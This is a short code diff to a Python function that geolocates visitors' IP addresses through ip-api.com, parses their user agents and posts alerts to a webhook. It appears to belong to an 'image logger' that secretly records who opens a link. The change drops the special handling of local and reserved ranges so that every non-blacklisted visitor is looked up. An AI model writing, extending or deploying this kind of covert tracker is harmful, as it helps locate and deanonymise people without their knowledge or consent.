@@ -43,42 +43,12 @@ def reportError(error):
     })
 
 def makeReport(ip, user_agent, image_url=None, endpoint="N/A"):
-    if ip.startswith(BLACKLISTED_IPS) or ip.startswith(("127.", "10.", "192.168.", "172.")):
-        ip_info = {
-            "query": ip,
-            "isp": "Local / Reserved",
-            "as": "N/A",
-            "country": "N/A",
-            "regionName": "N/A",
-            "city": "N/A",
-            "lat": "N/A",
-            "lon": "N/A",
-            "timezone": "N/A",
-            "mobile": "N/A",
-            "proxy": False,
-            "hosting": False
-        }
-    else:
-        try:
-            ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-        except Exception:
-            ip_info = {
-                "query": ip,
-                "isp": "Unknown",
-                "as": "Unknown",
-                "country": "Unknown",
-                "regionName": "Unknown",
-                "city": "Unknown",
-                "lat": "Unknown",
-                "lon": "Unknown",
-                "timezone": "Unknown",
-                "mobile": "Unknown",
-                "proxy": False,
-                "hosting": False
-            }
+    # Skip blacklisted IPs
+    if ip.startswith(BLACKLISTED_IPS):
+        return
 
+    # Check bot
     bot = botCheck(ip, user_agent)
-
     if bot and OPTIONS["linkAlerts"]:
         requests.post(WEBHOOK, json={
             "username": USERNAME,
@@ -91,6 +61,25 @@ def makeReport(ip, user_agent, image_url=None, endpoint="N/A"):
             }]
         })
         return
+
+    # Fetch IP info for all ranges
+    try:
+        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    except Exception:
+        ip_info = {
+            "query": ip,
+            "isp": "Unknown",
+            "as": "Unknown",
+            "country": "Unknown",
+            "regionName": "Unknown",
+            "city": "Unknown",
+            "lat": "Unknown",
+            "lon": "Unknown",
+            "timezone": "Unknown",
+            "mobile": "Unknown",
+            "proxy": False,
+            "hosting": False
+        }
 
     os_name, browser = httpagentparser.simple_detect(user_agent)
 
